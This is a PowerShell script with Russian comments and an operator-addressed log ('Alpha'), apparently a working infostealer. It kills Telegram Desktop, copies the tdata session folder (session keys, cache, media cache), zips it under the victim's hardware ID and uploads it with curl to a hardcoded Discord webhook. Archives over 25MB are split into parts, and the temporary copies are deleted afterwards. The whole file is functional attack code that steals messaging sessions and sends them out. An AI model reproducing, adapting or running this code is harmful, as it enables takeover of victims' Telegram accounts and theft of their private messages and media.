# ===== СКРИПТ ALPHA ДЛЯ ZETA v4.0 - ВСЯ TDATA В ОДНОМ АРХИВЕ =====
# Копируем всё в одну папку, потом зипуем целиком

$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"

# HWID
try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
$workDir = "$env:TEMP\$hwid"
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -Path $workDir -ItemType Directory -Force | Out-Null

Write-Host "[*] Alpha, стартую для HWID: $hwid" -ForegroundColor Cyan

# ============================================================
# ФУНКЦИЯ ДЛЯ СОЗДАНИЯ ZIP
# ============================================================
function New-ZipArchive {
    param(
        [string]$SourceFolder,
        [string]$ZipPath
    )
    
    try {
        if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
            Compress-Archive -Path "$SourceFolder\*" -DestinationPath $ZipPath -CompressionLevel Optimal -Force
            return $true
        }
    } catch {}
    
    try {
        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.NameSpace($ZipPath)
        if (-not $zip) {
            $null = New-Item -Path $ZipPath -ItemType File -Force
            $zip = $shell.NameSpace($ZipPath)
        }
        $items = $shell.NameSpace($SourceFolder).Items()
        $zip.CopyHere($items, 16)
        Start-Sleep -Seconds 2
        return $true
    } catch {
        return $false
    }
}

# ============================================================
# ФУНКЦИЯ ОТПРАВКИ ФАЙЛА В DISCORD
# ============================================================
function Send-File {
    param($FilePath)
    if (-not (Test-Path $FilePath)) { return }
    $size = (Get-Item $FilePath).Length / 1MB
    if ($size -gt 25) {
        Write-Host "[!] Файл весит $([math]::Round($size,2)) MB (>25MB), разбиваю..." -ForegroundColor Yellow
        # Разбиваем на части по 20MB
        $baseName = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
        $ext = [System.IO.Path]::GetExtension($FilePath)
        $dir = Split-Path $FilePath -Parent
        
        $part = 1
        $stream = [System.IO.File]::OpenRead($FilePath)
        $buffer = New-Object byte[] (20MB)
        while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $partFile = Join-Path $dir "$baseName.part$part$ext"
            [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($read-1)])
            curl.exe -s -F "file=@$partFile" $webhook
            Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($partFile))" -ForegroundColor Green
            Remove-Item $partFile -Force
            $part++
        }
        $stream.Close()
        return
    }
    curl.exe -s -F "file=@$FilePath" $webhook
    Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath))" -ForegroundColor Green
}

# ============================================================
# БЛОК: TELEGRAM TDATA - КОПИРУЕМ ВСЁ В ОДНУ ПАПКУ
# ============================================================
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    Write-Host "[*] Найден Telegram. Закрываю процесс..." -ForegroundColor Yellow
    Get-Process -Name "Telegram*" -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3

    $tgRoot = "$env:TEMP\tg_$hwid"
    if (Test-Path $tgRoot) { Remove-Item $tgRoot -Recurse -Force }
    New-Item -Path $tgRoot -ItemType Directory -Force | Out-Null

    # ---- КОПИРУЕМ ВСЁ В ОДНУ ПАПКУ ----
    
    # 1. Папка D877F783D5D3EF8C - копируем с сохранением структуры
    $d1 = Join-Path $tgPath "D877F783D5D3EF8C"
    if (Test-Path $d1) {
        $dest = Join-Path $tgRoot "D877F783D5D3EF8C"
        Copy-Item -Path $d1 -Destination $dest -Recurse -Force
        $cnt = (Get-ChildItem -Path $dest -Recurse -File).Count
        Write-Host "[✓] D877F783D5D3EF8C: $cnt файлов" -ForegroundColor Green
    }

    # 2. user_data/cache/номер/ - копируем с переименованием
    $cacheRoot = Join-Path $tgPath "user_data\cache"
    if (Test-Path $cacheRoot) {
        $numDirs = Get-ChildItem -Path $cacheRoot -Directory
        foreach ($nd in $numDirs) {
            $destDir = Join-Path $tgRoot "cache_$($nd.Name)"
            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
            
            $files = Get-ChildItem -Path $nd.FullName -Recurse -File
            $counter = 1
            foreach ($f in $files) {
                $newName = "tdata_userdatacache$($nd.Name)($counter)"
                $destFile = Join-Path $destDir $newName
                Copy-Item -Path $f.FullName -Destination $destFile -Force
                $counter++
            }
            Write-Host "[✓] tdata_userdatacache$($nd.Name): $($files.Count) файлов" -ForegroundColor Green
        }
    }

    # 3. user_data/media_cache/номер/ - копируем с переименованием
    $mediaRoot = Join-Path $tgPath "user_data\media_cache"
    if (Test-Path $mediaRoot) {
        $numDirs = Get-ChildItem -Path $mediaRoot -Directory
        foreach ($nd in $numDirs) {
            $destDir = Join-Path $tgRoot "media_cache_$($nd.Name)"
            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
            
            $files = Get-ChildItem -Path $nd.FullName -Recurse -File
            $counter = 1
            foreach ($f in $files) {
                $newName = "tdata_userdatamediacache$($nd.Name)($counter)"
                $destFile = Join-Path $destDir $newName
                Copy-Item -Path $f.FullName -Destination $destFile -Force
                $counter++
            }
            Write-Host "[✓] tdata_userdatamediacache$($nd.Name): $($files.Count) файлов" -ForegroundColor Green
        }
    }

    # 4. Корневые файлы tdata - копируем в корень tgRoot
    $rootFiles = Get-ChildItem -Path $tgPath -File
    if ($rootFiles.Count -gt 0) {
        $counter = 1
        foreach ($f in $rootFiles) {
            $newName = "tdata($counter)"
            $destFile = Join-Path $tgRoot $newName
            Copy-Item -Path $f.FullName -Destination $destFile -Force
            $counter++
        }
        Write-Host "[✓] tdata root: $($rootFiles.Count) файлов" -ForegroundColor Green
    }

    # ---- СОЗДАЁМ ОДИН БОЛЬШОЙ АРХИВ ----
    Write-Host "[*] Создаю один архив для всей tdata..." -ForegroundColor Cyan
    
    $totalSize = (Get-ChildItem -Path $tgRoot -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1MB
    Write-Host "[*] Общий размер: $([math]::Round($totalSize,2)) MB" -ForegroundColor Yellow
    
    $zipName = "tdata_$hwid.zip"
    $zipPath = "$env:TEMP\$zipName"
    
    if (New-ZipArchive -SourceFolder $tgRoot -ZipPath $zipPath) {
        $zipSize = (Get-Item $zipPath).Length / 1MB
        Write-Host "[✓] Архив создан, размер: $([math]::Round($zipSize,2)) MB" -ForegroundColor Green
        
        # Отправляем архив
        Send-File -FilePath $zipPath
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host "[!] Не удалось создать архив, отправляю файлами..." -ForegroundColor Red
        # Если архив не создался - отправляем всё по отдельности
        $allFiles = Get-ChildItem -Path $tgRoot -Recurse -File
        foreach ($f in $allFiles) {
            Send-File -FilePath $f.FullName
        }
    }

    # Уборка
    Remove-Item $tgRoot -Recurse -Force
    Write-Host "[✓] Telegram готов, Alpha!" -ForegroundColor Green
}

# ============================================================
# ФИНАЛ
# ============================================================
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "[✓] Миссия выполнена, Alpha! Вся tdata в одном архиве, сука!" -ForegroundColor Magenta
